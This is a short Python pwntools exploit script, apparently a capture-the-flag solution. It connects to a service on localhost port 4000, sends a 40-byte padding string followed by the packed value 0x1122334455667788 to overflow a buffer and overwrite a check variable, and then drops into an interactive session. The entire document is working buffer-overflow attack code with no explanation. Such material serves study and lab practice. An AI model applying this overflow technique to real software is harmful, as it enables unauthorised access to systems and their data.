from pwn import *

r = remote('localhost', 4000)

offset = 40
check = 0x1122334455667788

payload = b'A' * offset
payload += p64(check)

r.sendlineafter(b'>>> ', payload)

r.interactive()
